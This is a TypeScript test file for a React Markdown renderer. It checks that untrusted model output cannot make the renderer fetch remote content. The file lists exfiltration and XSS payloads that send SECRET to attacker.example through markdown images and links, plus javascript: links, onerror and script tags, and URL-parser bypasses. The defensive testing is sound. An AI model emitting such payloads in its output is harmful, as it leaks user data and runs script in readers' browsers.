/**
 * P2: the model-text trust boundary, end to end through `Markdown contentTrust="untrusted"`.
 * Payloads are the exfiltration set from docs/v3/evidence/gap-performance-budgets-and-library-tiebreaks.md
 * §5.2 plus the URL-parser bypasses the 2.x prefix check let through.
 */
import { describe, expect, test } from 'bun:test'
import type { Element, Root } from 'hast'
import { renderToStaticMarkup, renderToString } from 'react-dom/server'
import { Markdown } from './markdown'

const PAYLOADS: ReadonlyArray<readonly [name: string, source: string]> = [
  ['https image', '![x](https://attacker.example/p?d=SECRET)'],
  ['data image', '![x](data:image/svg+xml;base64,PHN2Zy8+)'],
  ['javascript link', '[x](javascript:alert(1))'],
  ['raw img onerror', '<img src=x onerror=alert(1)>'],
  ['raw script', '<script>alert(1)</script>'],
  ['raw iframe', '<iframe src="https://attacker.example"></iframe>'],
  ['raw style', '<style>@import url(https://attacker.example/x.css)</style>'],
  ['http link', '[x](http://attacker.example/p?d=SECRET)'],
  ['protocol-relative link', '[x](//attacker.example/p?d=SECRET)'],
  ['protocol-relative image', '![x](//attacker.example/p?d=SECRET)'],
  ['backslash image', '![x](/\\attacker.example/x)'],
  ['reference-style image', '![x][r]\n\n[r]: https://attacker.example/p?d=SECRET'],
  ['html entity scheme', '[x](&#106;avascript:alert(1))'],
]

const BLOCKED_URLS: ReadonlyArray<readonly [name: string, url: string]> = [
  ['protocol-relative', '//h'],
  ['backslash', '/\\h'],
  ['tab', '/\t/h'],
  ['leading space', ' /h'],
  ['data', 'data:text/html,x'],
  ['remend image sentinel', 'streamdown:incomplete-image'],
  ['remend link sentinel', 'streamdown:incomplete-link'],
]

function injectImg() {
  return (tree: Root): undefined => {
    const img: Element = {
      type: 'element',
      tagName: 'img',
      properties: { src: 'https://attacker.example/injected.png' },
      children: [],
    }
    tree.children.push(img)
    return undefined
  }
}

// Props forced past the types, as a plain-JS caller or an `as` cast could.
const Loose = Markdown as unknown as React.ComponentType<Record<string, unknown>>
const FORCED = {
  sanitize: { allowTags: ['img'], allowAttrs: { img: ['src'] } },
  rehypePlugins: [injectImg],
}

function expectNoRemoteFetch(out: string) {
  expect(out).not.toContain('<img')
  expect(out).not.toContain('<link')
  expect(out).not.toContain('rel="preload"')
  expect(out).not.toContain('<script')
  expect(out).not.toContain('<iframe')
  expect(out).not.toContain('<style')
  expect(out).not.toContain('onerror')
  expect(out).not.toContain('attacker.example')
  expect(out).not.toContain('SECRET')
}

// micromark percent-encodes a backslash or tab before the URL policy sees it (`/\\h` becomes
// `/%5Ch`), which the browser reads as a path on the page's own origin. What must never survive is
// a scheme, a host, or a protocol-relative src (also true on the trusted arm).
function expectOnlySameOriginImages(out: string) {
  expect(out).not.toContain('<link')
  expect(out).not.toContain('rel="preload"')
  for (const [, src] of out.matchAll(/<img[^>]* src="([^"]*)"/g)) {
    expect(src).not.toMatch(/^(?:[a-z][a-z0-9+.-]*:|\/\/|\\)/i)
  }
}

describe('untrusted: the exfiltration payload set', () => {
  describe.each([
    ['settled', false],
    ['streaming', true],
  ])('%s', (_label, streaming) => {
    test.each(PAYLOADS)('%s', (_name, source) => {
      expectNoRemoteFetch(
        renderToStaticMarkup(
          <Markdown contentTrust="untrusted" streaming={streaming}>
            {source}
          </Markdown>,
        ),
      )
    })

    test.each(PAYLOADS)(
      '%s with sanitize and rehypePlugins forced past the types',
      (_name, source) => {
        expectNoRemoteFetch(
          renderToStaticMarkup(
            <Loose contentTrust="untrusted" streaming={streaming} {...FORCED}>
              {source}
            </Loose>,
          ),
        )
      },
    )

    test.each(PAYLOADS)('%s with images="same-origin"', (_name, source) => {
      const out = renderToStaticMarkup(
        <Markdown contentTrust="untrusted" images="same-origin" streaming={streaming}>
          {source}
        </Markdown>,
      )

      expectOnlySameOriginImages(out)
    })
  })

  test('the injected-img plugin really would add an img on the trusted arm', () => {
    const out = renderToStaticMarkup(
      <Markdown
        contentTrust="trusted"
        rehypePlugins={[injectImg]}
        sanitize={{ allowTags: ['img'] }}
      >
        a
      </Markdown>,
    )

    expect(out).toContain('<img')
  })
})

describe('untrusted: blocked URLs as image and as link', () => {
  test.each(BLOCKED_URLS)('image %s', (_name, url) => {
    for (const options of [{}, { images: 'same-origin' }] as const) {
      const out = renderToString(
        <Markdown contentTrust="untrusted" {...options}>
          {`![x](<${url}>)`}
        </Markdown>,
      )

      if (Object.keys(options).length === 0) expect(out).not.toContain('<img')
      else expectOnlySameOriginImages(out)
      expect(out).not.toContain('<link')
      expect(out).not.toContain('rel="preload"')
      expect(out).not.toContain('streamdown:')
    }
  })

  test.each(BLOCKED_URLS)('link %s', (_name, url) => {
    const out = renderToString(<Markdown contentTrust="untrusted">{`[x](<${url}>)`}</Markdown>)

    expect(out).not.toMatch(/href="(?:\/\/|\/\\|data:|streamdown:)/)
    expect(out).not.toContain('streamdown:')
    expect(out).not.toContain('data:text')
  })

  test('a markdown-escaped backslash host never becomes a protocol-relative href', () => {
    const out = renderToStaticMarkup(
      <Markdown contentTrust="untrusted">{'[x](/\\attacker.example/x)'}</Markdown>,
    )

    expect(out).not.toMatch(/href="\/\//)
    expect(out).not.toMatch(/href="\/\\/)
  })
})

describe('trusted arm', () => {
  test('renders https images', () => {
    const out = renderToStaticMarkup(
      <Markdown contentTrust="trusted">![x](https://cdn.example/a.png)</Markdown>,
    )

    expect(out).toContain('<img')
    expect(out).toContain('src="https://cdn.example/a.png"')
  })

  test.each(BLOCKED_URLS)('blocks %s image', (_name, url) => {
    const out = renderToStaticMarkup(<Markdown contentTrust="trusted">{`![x](<${url}>)`}</Markdown>)

    expectOnlySameOriginImages(out)
    expect(out).not.toContain('streamdown:')
    expect(out).not.toContain('data:')
  })

  test('still strips script, iframe and style from raw source', () => {
    const out = renderToStaticMarkup(
      <Markdown contentTrust="trusted">
        {'<script>a</script><iframe src="https://h"></iframe><style>x{}</style>'}
      </Markdown>,
    )

    expect(out).not.toMatch(/<(script|iframe|style)/)
  })
})
